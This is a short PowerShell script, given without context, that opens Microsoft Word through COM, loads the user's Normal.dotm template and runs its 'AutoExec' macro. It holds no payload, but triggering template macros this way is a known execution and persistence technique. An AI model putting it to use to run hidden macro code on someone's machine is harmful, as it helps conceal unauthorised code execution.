$wd = new-object -comobject word.application
$wd.documents.open("$env:userprofile\AppData\Roaming\Microsoft\Templates\Normal.dotm")
$wd.run("AutoExec")
$wd.quit() # exit application
